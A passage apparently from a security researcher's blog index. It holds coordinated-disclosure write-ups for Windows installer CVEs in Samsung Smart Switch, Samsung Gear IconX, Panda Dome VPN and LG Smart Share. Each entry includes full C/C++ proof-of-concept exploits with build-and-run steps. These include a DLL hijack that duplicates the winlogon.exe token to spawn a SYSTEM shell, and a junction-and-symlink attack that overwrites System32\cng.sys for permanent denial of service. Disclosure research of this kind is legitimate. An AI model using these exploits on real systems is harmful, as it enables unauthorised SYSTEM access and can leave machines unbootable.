s; \\ (p)-&gt;pSecurityQualityOfService = NULL; \\}typedef struct _REPARSE_DATA_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; union { struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; ULONG Flags; WCHAR PathBuffer[1]; } SymbolicLinkReparseBuffer; struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; WCHAR PathBuffer[1]; } MountPointReparseBuffer; struct { UCHAR DataBuffer[1]; } GenericReparseBuffer; } DUMMYUNIONNAME;} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;typedef struct _FILE_DISPOSITION_INFORMATION_EX { ULONG Flags;} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer;} UNICODE_STRING;typedef UNICODE_STRING* PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { ULONG uLength; HANDLE hRootDirectory; PUNICODE_STRING pObjectName; ULONG uAttributes; PVOID pSecurityDescriptor; PVOID pSecurityQualityOfService;} OBJECT_ATTRIBUTES;typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information;} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;ULONG(WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);ULONG(WINAPI* _RtlNtStatusToDosError)(NTSTATUS Status);NTSTATUS(WINAPI* _NtCreateFile)( PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)( OUT PHANDLE pHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PUNICODE_STRING DestinationName);NTSTATUS(WINAPI* _NtClose)( HANDLE Handle );NtDefine.h Use Visual Studio 2022. Compile the project in the exploit directory in x86 Release mode. Run exploit.exe. Run Smart Switch PC_4.3.23022_1.exe to perform Samsung Smart Switch installation.0x06: Affected ProductsThis vulnerability affects the following product: Smart Switch PC &lt; 4.3.23043_30x07: Credit informationHeeChan Kim (@heegong123) of TeamH4C0x08: TimeLine 2023/02/23 : First time contacted via Samsung Mobile Security. 2023/02/23 : I received a call from Samsung Mobile Security to analyze the vulnerability. 2023/03/17 : I received a call from Samsung Mobile Security to determine the vulnerability as high and proceed with the patch. 2023/07/06 : The vulnerability has been patched, and CVE-2023-30672(SVE-2023-0310) has been issued.0x09: Reference https://security.samsungmobile.com/serviceWeb.smsb?year=2023&amp;month=07 https://nvd.nist.gov/vuln/detail/CVE-2023-30672" }, { "title": "CVE-2023-37849: Local privilege escalation in Panda Dome VPN for Windows Installer", "url": "/posts/Local-privilege-escalation-in-Panda-Dome-VPN-for-Windows-Installer/", "categories": "0-day", "tags": "Panda Security, 0-day, CVE, EoP, Mitre, LPE", "date": "2023-07-09 00:00:00 +0900", "snippet": "0x01: Details Title: Local privilege escalation in Panda Dome VPN for Windows Installer CVE ID: CVE-2023-37849 Advisory Published: 2023/07/05 Advisory URL : https://www.pandasecurity.com/en/support/card?id=100080 CVSS : 6.5 MEDIUM(CVSS Version 3.x)0x02: Test EnvironmentPanda Dome Version : 21.01.00OS : Windows 10 Pro 64-bit 21H2 (build 19044.1826)0x03: Vulnerability detailsVulnerability that allows a local attacker to gain SYSTEM privileges by exploiting administrator privileges, and that enables the server thread to perform actions on behalf of the client, but within the limits of the client’s security context.0x04: Technical descriptionMany DLLs are loaded from the directory where the Panda Security VPN installer file PANDAVPN.exe is located. If these DLLs are not in the directory, DLLs are loaded from the C:\\Windows\\SysWOW64 directory. Among these Dlls, TextShaping.dll is loaded, and this DLL load is done with Administrator privileges. So, by placing TextShaping.dll in the directory where the Panda Security VPN installer file is located, you can gain SYSTEM privileges by abusing Administrator privileges.0x05: Proof-of-Concept (PoC)#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;Psapi.h&gt;#include &lt;Tlhelp32.h&gt;#include &lt;sddl.h&gt;#pragma comment (lib,\"advapi32.lib\")int exploit() {\tDWORD lpidProcess[2048], lpcbNeeded, cProcesses;\tEnumProcesses(lpidProcess, sizeof(lpidProcess), &amp;lpcbNeeded);\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\tPROCESSENTRY32 p32;\tp32.dwSize = sizeof(PROCESSENTRY32);\tint processWinlogonPid;\tif (Process32First(hSnapshot, &amp;p32)) {\t\tdo {\t\t\tif (wcscmp(p32.szExeFile, L\"winlogon.exe\") == 0) {\t\t\t\tprintf(\"[+] Located winlogon.exe by process name (PID %d)\\n\", p32.th32ProcessID);\t\t\t\tprocessWinlogonPid = p32.th32ProcessID;\t\t\t\tbreak;\t\t\t}\t\t} while (Process32Next(hSnapshot, &amp;p32));\t\tCloseHandle(hSnapshot);\t}\tLUID luid;\tHANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());\tif (currentProc) {\t\tHANDLE TokenHandle = NULL;\t\tBOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;TokenHandle);\t\tif (hProcessToken) {\t\t\tBOOL checkToken = LookupPrivilegeValue(NULL, L\"SeDebugPrivilege\", &amp;luid);\t\t\tif (!checkToken) {\t\t\t\tprintf(\"[+] Current process token already includes SeDebugPrivilege\\n\");\t\t\t}\t\t\telse {\t\t\t\tTOKEN_PRIVILEGES tokenPrivs;\t\t\t\ttokenPrivs.PrivilegeCount = 1;\t\t\t\ttokenPrivs.Privileges[0].Luid = luid;\t\t\t\ttokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\t\t\t\tBOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &amp;tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);\t\t\t\tif (adjustToken != 0) {\t\t\t\t\tprintf(\"[+] Added SeDebugPrivilege to the current process token\\n\");\t\t\t\t}\t\t\t}\t\t\tCloseHandle(TokenHandle);\t\t}\t}\tCloseHandle(currentProc);\tHANDLE hProcess = NULL;\tHANDLE TokenHandle = NULL;\tHANDLE NewToken = NULL;\tBOOL OpenToken;\tBOOL Impersonate;\tBOOL Duplicate;\thProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processWinlogonPid);\tif (!hProcess) {\t\tprintf(\"[-] Failed to obtain a HANDLE to the target PID\\n\");\t\treturn -1;\t}\tprintf(\"[+] Obtained a HANDLE to the target PID\\n\");\tOpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &amp;TokenHandle);\tif (!OpenToken) {\t\tprintf(\"[-] Failed to obtain a HANDLE to the target TOKEN %d\\n\", GetLastError());\t}\tprintf(\"[+] Obtained a HANDLE to the target TOKEN\\n\");\tImpersonate = ImpersonateLoggedOnUser(TokenHandle);\tif (!Impersonate) {\t\tprintf(\"[-] Failed to impersonate the TOKEN's user\\n\");\t\treturn -1;\t}\tprintf(\"[+] Impersonated the TOKEN's user\\n\");\tDuplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;NewToken);\tif (!Duplicate) {\t\tprintf(\"[-] Failed to duplicate the target TOKEN\\n\");\t\treturn -1;\t}\tprintf(\"[+] Duplicated the target TOKEN\\n\");\tBOOL NewProcess;\tSTARTUPINFO lpStartupInfo = { 0 };\tPROCESS_INFORMATION lpProcessInformation = { 0 };\tlpStartupInfo.cb = sizeof(lpStartupInfo);\tNewProcess = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, L\"C:\\\\Windows\\\\System32\\\\cmd.exe\", NULL, 0, NULL, NULL, &amp;lpStartupInfo, &amp;lpProcessInformation);\tif (!NewProcess) {\t\tprintf(\"[-] Failed to create a SYSTEM process\\n\");\t\treturn -1;\t}\tprintf(\"[+] Created a SYSTEM process\\n\");\tCloseHandle(NewToken);\tCloseHandle(hProcess);\tCloseHandle(TokenHandle);\treturn 0;}BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) { switch (fdwReason) { case DLL_PROCESS_ATTACH: {\t\t\texploit();\t\t\texit(-1); break; } case DLL_THREAD_ATTACH: { break; } case DLL_THREAD_DETACH: { break; } case DLL_PROCESS_DETACH: { break; } } return TRUE;} Use Visual Studio 2019. Compile the project in the DLL directory in x86 Release mode. Rename the compiled dll to TextShaping.dll and place it in the same directory as PANDAVPN.exe. Run PANDAVPN.exe to perform Panda Security VPN installation.0x06: Affected ProductsThis vulnerability affects the following product: Panda Security VPN Version &lt; 15.14.80x07: Credit informationHeeChan Kim (@heegong123) of TeamH4C0x08: TimeLine 2022/08/01 : First time contacted via Panda Security Email(secure@pandasecurity.com). 2022/08/10 : I recevied a file which is patched via Panda Security. 2023/07/05 : The vulnerability has been patched, and I have been notified that the vulnerability has been disclosed. 2023/07/09 : Request a CVE id via MITRE. 2023/07/13 : Received a call from MITRE for CVE-2023-37849.0x09: Reference https://www.pandasecurity.com/en/homeusers/vpn/ https://www.pandasecurity.com/en/support/card?id=100080 https://nvd.nist.gov/vuln/detail/CVE-2023-37849" }, { "title": "CVE-2022-39909: Insufficient verification of data authenticity vulnerability in Samsung Gear IconX PC Manager", "url": "/posts/CVE-2022-39909-Insufficient-verification-of-data-authenticity-vulnerability-in-Samsung-Gear-IconX-PC-Manager/", "categories": "0-day", "tags": "Samsung, 0-day, CVE, CVE-2022-39909, EoP, DoS, Mitre", "date": "2022-12-06 00:00:00 +0900", "snippet": "0x01: Details Title: Insufficient verification of data authenticity vulnerability in Samsung Gear IconX PC Manager CVE ID: CVE-2022-39909 Vendor ID : SVE-2022-2040 Advisory Published: 2022/12/06 Advisory URL : https://security.samsungmobile.com/serviceWeb.smsb?year=2022&amp;month=12 Vendor URL : https://security.samsungmobile.com/0x02: Test Environment Samsung Gear IconX for Windows : 2.0.170927.51 OS : Windows 10 Pro 64-bit 21H2 (build 19044.1889)0x03: Vulnerability detailsInsufficient verification of data authenticity vulnerability in Samsung Gear IconX PC Manager prior to version 2.1.221019.51 allows local attackers to create arbitrary file using symbolic link.0x04: Technical descriptionThe Samsung Gear IconX installer operates with Administrator privileges. During the installation process, the installer creates an Gear IconX.lnk file in the C:\\Users\\%Username%\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch directory. At this time, the path C:\\Users\\%Username%\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\Gear IconX.lnk can be accessed even by normal users, so by creating a symbolic link to C:\\Windows\\System32\\cng.sys, the administrator’s authority exploits an Arbitrary file creation vulnerability. At this time, if the cng.sys file is written in the C:\\Windows\\System32 directory, the permanent Denial-of-Service vulnerability occurs.Note: %Username% must be replaced with the account name of the user logged into Windows.0x05: Proof-of-Concept (PoC)// main.cpp#define _CRT_SECURE_NO_WARNINGS#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;wchar.h&gt;#include &lt;string&gt;#include \"NtDefine.h\"DWORD LastError = 0;void SetLastErr(DWORD err) {\tLastError = err;}std::wstring BuildNativePath(std::wstring path) {\tif (path.rfind(L\"\\\\\", 0) != std::wstring::npos) {\t\treturn path;\t}\tpath = L\"\\\\??\\\\\" + path;\treturn path;}HANDLE OpenDirectory(std::wstring directory, DWORD access_mask, DWORD share_mode, DWORD creation_disposition) {\tdirectory = BuildNativePath(directory);\tHANDLE h;\tOBJECT_ATTRIBUTES objattr;\tUNICODE_STRING target;\tIO_STATUS_BLOCK io;\tNTSTATUS status;\t_RtlInitUnicodeString(&amp;target, directory.c_str());\tInitializeObjectAttributes(&amp;objattr, &amp;target, OBJ_CASE_INSENSITIVE, nullptr, nullptr);\tswitch (creation_disposition) {\tcase CREATE_NEW:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t\tbreak;\tcase OPEN_EXISTING:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_OPEN, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t\tbreak;\tdefault:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t}\tif (status != STATUS_SUCCESS) {\t\tSetLastErr(_RtlNtStatusToDosError(status));\t\treturn NULL;\t}\treturn h;}bool CreateMountPoint(std::wstring dir, std::wstring target, std::wstring printname) {\tHANDLE hdir = OpenDirectory(dir, GENERIC_WRITE, ALL_SHARING, OPEN_ALWAYS);\ttarget = BuildNativePath(target);\tsize_t targetsz = target.size() * 2;\tsize_t printnamesz = printname.size() * 2;\tsize_t pathbuffersz = targetsz + printnamesz + 12;\tsize_t totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;\tREPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)_malloca(totalsz);\tmemset(rdb, 0, totalsz);\trdb-&gt;ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;\trdb-&gt;ReparseDataLength = static_cast&lt;USHORT&gt;(pathbuffersz);\trdb-&gt;Reserved = NULL;\trdb-&gt;MountPointReparseBuffer.SubstituteNameOffset = NULL;\trdb-&gt;MountPointReparseBuffer.SubstituteNameLength = static_cast&lt;USHORT&gt;(targetsz);\tmemcpy(rdb-&gt;MountPointReparseBuffer.PathBuffer, target.c_str(), targetsz + 2);\trdb-&gt;MountPointReparseBuffer.PrintNameOffset = static_cast&lt;USHORT&gt;(targetsz + 2);\trdb-&gt;MountPointReparseBuffer.PrintNameLength = static_cast&lt;USHORT&gt;(printnamesz);\tmemcpy(rdb-&gt;MountPointReparseBuffer.PathBuffer + target.size() + 1, printname.c_str(), printnamesz + 2);\tDWORD cb = 0;\tbool ret = DeviceIoControl(hdir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, nullptr, NULL, &amp;cb, NULL) == TRUE;\t_NtClose(hdir);\treturn ret;}HANDLE CreateNativeSymlink(std::wstring link, std::wstring target) {\tHANDLE ret;\tUNICODE_STRING ulnk;\tUNICODE_STRING utarget;\tNTSTATUS status;\t_RtlInitUnicodeString(&amp;ulnk, link.c_str());\t_RtlInitUnicodeString(&amp;utarget, target.c_str());\tOBJECT_ATTRIBUTES objattr;\tInitializeObjectAttributes(&amp;objattr, &amp;ulnk, OBJ_CASE_INSENSITIVE, nullptr, nullptr);\tNTSTATUS stat = _NtCreateSymbolicLinkObject(&amp;ret, SYMBOLIC_LINK_ALL_ACCESS,\t\t&amp;objattr, &amp;utarget);\tif (stat != STATUS_SUCCESS) {\t\tSetLastErr(_RtlNtStatusToDosError(stat));\t\treturn nullptr;\t}\treturn ret;}DWORD DeleteAllFiles(LPCWSTR szDir, DWORD recur) {\tHANDLE hSrch;\tWIN32_FIND_DATA wfd;\tDWORD res = 1;\tTCHAR DelPath[MAX_PATH];\tTCHAR FullPath[MAX_PATH];\tTCHAR TempPath[MAX_PATH];\tlstrcpy(DelPath, szDir);\tlstrcpy(TempPath, szDir);\tif (lstrcmp(DelPath + lstrlen(DelPath) - 4, L\"\\\\*.*\") != 0) {\t\tlstrcat(DelPath, L\"\\\\*.*\");\t}\thSrch = FindFirstFile(DelPath, &amp;wfd);\tif (hSrch == INVALID_HANDLE_VALUE) {\t\tif (recur &gt; 0) RemoveDirectory(TempPath);\t\treturn -1;\t}\twhile (res) {\t\twsprintf(FullPath, L\"%s\\\\%s\", TempPath, wfd.cFileName);\t\tif (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_READONLY) {\t\t\tSetFileAttributes(FullPath, FILE_ATTRIBUTE_NORMAL);\t\t}\t\tif (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) {\t\t\tif (lstrcmp(wfd.cFileName, L\".\")\t\t\t\t&amp;&amp; lstrcmp(wfd.cFileName, L\"..\")) {\t\t\t\trecur++;\t\t\t\tDeleteAllFiles(FullPath, recur);\t\t\t\trecur--;\t\t\t}\t\t}\t\telse {\t\t\tDeleteFile(FullPath);\t\t}\t\tres = FindNextFile(hSrch, &amp;wfd);\t}\tFindClose(hSrch);\tif (recur &gt; 0) RemoveDirectory(TempPath);\treturn 0;}void NtInit() {\tLoadLibrary(L\"ntdll.dll\");\tHMODULE hm = GetModuleHandle(L\"ntdll.dll\");\t_RtlInitUnicodeString = (ULONG(WINAPI*)(PUNICODE_STRING, PCWSTR))GetProcAddress(hm, \"RtlInitUnicodeString\");\t_RtlNtStatusToDosError = (ULONG(WINAPI*) (NTSTATUS Status))GetProcAddress(hm, \"RtlNtStatusToDosError\");\t_NtCreateSymbolicLinkObject = (NTSTATUS(WINAPI*)(\t\tOUT PHANDLE pHandle,\t\tIN ACCESS_MASK DesiredAccess,\t\tIN POBJECT_ATTRIBUTES ObjectAttributes,\t\tIN PUNICODE_STRING DestinationName))GetProcAddress(hm, \"NtCreateSymbolicLinkObject\");\t_NtCreateFile = (NTSTATUS(WINAPI*)(\t\tPHANDLE FileHandle,\t\tACCESS_MASK DesiredAccess,\t\tPOBJECT_ATTRIBUTES ObjectAttributes,\t\tPIO_STATUS_BLOCK IoStatusBlock,\t\tPLARGE_INTEGER AllocationSize,\t\tULONG FileAttributes,\t\tULONG ShareAccess,\t\tULONG CreateDisposition,\t\tULONG CreateOptions,\t\tPVOID EaBuffer,\t\tULONG EaLength))GetProcAddress(hm, \"NtCreateFile\");\t_NtClose = (NTSTATUS(WINAPI*)(HANDLE Handle))GetProcAddress(hm, \"NtClose\");}int main() {\tNtInit();\tstd::wstring UserProfilePath = std::wstring(_wgetenv(L\"USERPROFILE\"));\tstd::wstring LinkFile = L\"Gear IconX.lnk\";\tstd::wstring LinkDirectory = UserProfilePath + std::wstring(L\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\");\tstd::wstring TargetFile = L\"C:\\\\Windows\\\\System32\\\\cng.sys\";\tstd::wstring RpcControl = L\"\\\\RPC Control\";\tstd::wstring RpcControlFile = RpcControl + L\"\\\\\" + LinkFile;\tstd::wstring ParentDirectory = UserProfilePath + std::wstring(L\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\");\tif (GetFileAttributesW(ParentDirectory.c_str()) != INVALID_FILE_ATTRIBUTES) {\t\tDeleteAllFiles(ParentDirectory.c_str(), 1);\t}\tCreateDirectoryW(ParentDirectory.c_str(), NULL);\tif (!CreateMountPoint(LinkDirectory, RpcControl, L\"Junction\")) {\t\tstd::cout &lt;&lt; \"[-] RPC Control Junction Failed\" &lt;&lt; std::endl;\t\texit(0);\t}\tstd::cout &lt;&lt; \"[+] RPC Control Junction Success\" &lt;&lt; std::endl;\tHANDLE hFile = CreateNativeSymlink(RpcControlFile, BuildNativePath(TargetFile));\tif (hFile == INVALID_HANDLE_VALUE || hFile == NULL) {\t\tstd::cout &lt;&lt; \"[-] CreateNativeSymlink Failed\" &lt;&lt; std::endl;\t\texit(0);\t}\tstd::cout &lt;&lt; \"[+] CreateNativeSymlink Success Handle : \" &lt;&lt; hFile &lt;&lt; std::endl;\tstd::cout &lt;&lt; \"[+] CreateSymlink Success\" &lt;&lt; std::endl;\tstd::wcout &lt;&lt; L\"[+] \" &lt;&lt; (LinkDirectory + L\"\\\\\" + LinkFile) &lt;&lt; L\" -&gt; \" &lt;&lt; TargetFile &lt;&lt; std::endl;\tstd::cout &lt;&lt; \"Press ENTER to exit and delete the symlink\" &lt;&lt; std::endl;\tgetchar();\treturn 0;}main.cpp// NtDefine.h#pragma once#include &lt;Windows.h&gt;#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)#define STATUS_SUCCESS 0x00000000#define OBJ_CASE_INSENSITIVE 0x00000040L#define \tFILE_OPEN 0x00000001#define \tFILE_OPEN_IF 0x00000003#define \tFILE_CREATE 0x00000002#define \tFILE_DIRECTORY_FILE 0x00000001#define \tFILE_DIRECTORY_FILE 0x00000001#define \tFILE_OPEN_REPARSE_POINT 0x00200000#define ALL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE#define GENERIC_READ_WRITE GENERIC_READ|GENERIC_WRITE#define InitializeObjectAttributes( p, n, a, r, s ) { \\ (p)-&gt;uLength = sizeof( OBJECT_ATTRIBUTES ); \\ (p)-&gt;hRootDirectory = r; \\ (p)-&gt;uAttributes = a; \\ (p)-&gt;pObjectName = n; \\ (p)-&gt;pSecurityDescriptor = s; \\ (p)-&gt;pSecurityQualityOfService = NULL; \\}typedef struct _REPARSE_DATA_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; union { struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; ULONG Flags; WCHAR PathBuffer[1]; } SymbolicLinkReparseBuffer; struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; WCHAR PathBuffer[1]; } MountPointReparseBuffer; struct { UCHAR DataBuffer[1]; } GenericReparseBuffer; } DUMMYUNIONNAME;} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;typedef struct _FILE_DISPOSITION_INFORMATION_EX { ULONG Flags;} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer;} UNICODE_STRING;typedef UNICODE_STRING* PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { ULONG uLength; HANDLE hRootDirectory; PUNICODE_STRING pObjectName; ULONG uAttributes; PVOID pSecurityDescriptor; PVOID pSecurityQualityOfService;} OBJECT_ATTRIBUTES;typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information;} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;ULONG(WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);ULONG(WINAPI* _RtlNtStatusToDosError)(NTSTATUS Status);NTSTATUS(WINAPI* _NtCreateFile)( PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)( OUT PHANDLE pHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PUNICODE_STRING DestinationName);NTSTATUS(WINAPI* _NtClose)( HANDLE Handle );NtDefine.h Use Visual Studio 2019. Compile the project in the exploit directory in x86 Release mode. Run exploit.exe. Run Gear_IconX_2.0.170927.51.exe to perform Samsung Gear IconX installation.0x06: Affected ProductsThis vulnerability affects the following product: Samsung Gear IconX PC Manager &lt; 2.1.221019.510x07: Credit information HeeChan Kim (@heegong123) of TeamH4C0x08: TimeLine 2022/08/24 : First time contacted via Samsung Mobile Security. 2022/08/25 : I received a call from Samsung Mobile Security to analyze the vulnerability. 2022/10/19 : I received a call from Samsung Mobile Security to determine the vulnerability as moderate and proceed with the patch. 2022/12/06 : The vulnerability has been patched, and CVE-2022-39909 (SVE-2022-2040) has been issued.0x09: Reference https://security.samsungmobile.com/serviceWeb.smsb?year=2022&amp;month=12 https://www.cve.org/CVERecord?id=CVE-2022-39909 https://nvd.nist.gov/vuln/detail/CVE-2022-39909" }, { "title": "CVE-2022-45422: LG Smart Share Local Privilege Escalation Vulnerability", "url": "/posts/CVE-2022-45422-LG-Smart-Share-Local-Privilege-Escalation-Vulnerability/", "categories": "0-day", "tags": "LG, 0-day, CVE, CVE-2022-45422, EoP, LPE, PE, DLL hijacking, Mitre", "date": "2022-11-24 00:00:00 +0900", "snippet": "0x01: Details Title: LG Smart Share Local Privilege Escalation Vulnerability CVE ID: CVE-2022-45422 Vendor ID : LVE-HOT-220005 Advisory Published: 2022/11/24 Advisory URL : https://lgsecurity.lge.com/bulletins/pc#updateDetails CVSS : 7.8 HIGH(CVSS Version 3.x)0x02: Test Environment Samsung Smart Switch for Windows : 4.3.22063_6 OS : Windows 10 Pro 64-bit 21H2 (build 19044.1826)0x03: Vulnerability detailsWhen LG SmartShare is installed, local privilege escalation is possible through DLL Hijacking attack.0x04: Technical descriptionWhen installing the LG Smart Share program, various DLLs are loaded. At this time, !.DLL is loaded. This !.DLL is loaded from the directory registered in user environment variable and system environment variable. By locating the !.DLL created by an attacker, an installer with administrator privileges can load this DLL and escalate privileges to SYSTEM, thereby launching a privilege escalation attack by DLL hijacking.I discovered this vulnerability through Process Monitor.0x05: Proof-of-Concept (PoC)#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;Psapi.h&gt;#include &lt;Tlhelp32.h&gt;#include &lt;sddl.h&gt;#pragma comment (lib,\"advapi32.lib\")int exploit() {\tDWORD lpidProcess[2048], lpcbNeeded, cProcesses;\tEnumProcesses(lpidProcess, sizeof(lpidProcess), &amp;lpcbNeeded);\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\tPROCESSENTRY32 p32;\tp32.dwSize = sizeof(PROCESSENTRY32);\tint processWinlogonPid;\tif (Process32First(hSnapshot, &amp;p32)) {\t\tdo {\t\t\tif (wcscmp(p32.szExeFile, L\"winlogon.exe\") == 0) {\t\t\t\tprintf(\"[+] Located winlogon.exe by process name (PID %d)\\n\", p32.th32ProcessID);\t\t\t\tprocessWinlogonPid = p32.th32ProcessID;\t\t\t\tbreak;\t\t\t}\t\t} while (Process32Next(hSnapshot, &amp;p32));\t\tCloseHandle(hSnapshot);\t}\tLUID luid;\tHANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());\tif (currentProc) {\t\tHANDLE TokenHandle = NULL;\t\tBOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;TokenHandle);\t\tif (hProcessToken) {\t\t\tBOOL checkToken = LookupPrivilegeValue(NULL, L\"SeDebugPrivilege\", &amp;luid);\t\t\tif (!checkToken) {\t\t\t\tprintf(\"[+] Current process token already includes SeDebugPrivilege\\n\");\t\t\t}\t\t\telse {\t\t\t\tTOKEN_PRIVILEGES tokenPrivs;\t\t\t\ttokenPrivs.PrivilegeCount = 1;\t\t\t\ttokenPrivs.Privileges[0].Luid = luid;\t\t\t\ttokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\t\t\t\tBOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &amp;tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);\t\t\t\tif (adjustToken != 0) {\t\t\t\t\tprintf(\"[+] Added SeDebugPrivilege to the current process token\\n\");\t\t\t\t}\t\t\t}\t\t\tCloseHandle(TokenHandle);\t\t}\t}\tCloseHandle(currentProc);\tHANDLE hProcess = NULL;\tHANDLE TokenHandle = NULL;\tHANDLE NewToken = NULL;\tBOOL OpenToken;\tBOOL Impersonate;\tBOOL Duplicate;\thProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processWinlogonPid);\tif (!hProcess) {\t\tprintf(\"[-] Failed to obtain a HANDLE to the target PID\\n\");\t\treturn -1;\t}\tprintf(\"[+] Obtained a HANDLE to the target PID\\n\");\tOpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &amp;TokenHandle);\tif (!OpenToken) {\t\tprintf(\"[-] Failed to obtain a HANDLE to the target TOKEN %d\\n\", GetLastError());\t}\tprintf(\"[+] Obtained a HANDLE to the target TOKEN\\n\");\tImpersonate = ImpersonateLoggedOnUser(TokenHandle);\tif (!Impersonate) {\t\tprintf(\"[-] Failed to impersonate the TOKEN's user\\n\");\t\treturn -1;\t}\tprintf(\"[+] Impersonated the TOKEN's user\\n\");\tDuplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;NewToken);\tif (!Duplicate) {\t\tprintf(\"[-] Failed to duplicate the target TOKEN\\n\");\t\treturn -1;\t}\tprintf(\"[+] Duplicated the target TOKEN\\n\");\tBOOL NewProcess;\tSTARTUPINFO 